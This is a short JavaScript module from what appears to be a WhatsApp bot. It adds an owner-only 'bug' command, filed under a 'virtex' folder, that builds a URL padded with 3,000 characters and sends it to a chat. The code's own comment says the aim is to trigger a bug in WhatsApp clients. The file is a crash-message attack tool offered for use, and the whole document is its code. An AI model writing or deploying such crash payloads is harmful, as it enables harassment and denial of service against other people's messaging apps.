// lib/virtex/bug.js
// Sends a long URL that might trigger a bug in some WhatsApp clients

exports.execute = async (sock, msg, args) => {
    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;

    const ownerNumber = global.ownerNumber + '@s.whatsapp.net';
    if (sender !== ownerNumber) {
        await sock.sendMessage(from, { text: '❌ Only owner can use bug commands.' });
        return;
    }

    // Build a huge URL
    let longUrl = 'https://example.com/';
    for (let i = 0; i < 3000; i++) {
        longUrl += 'a';
    }
    longUrl += '/end';

    await sock.sendMessage(from, { text: `🔗 Bug URL: ${longUrl}` });
};
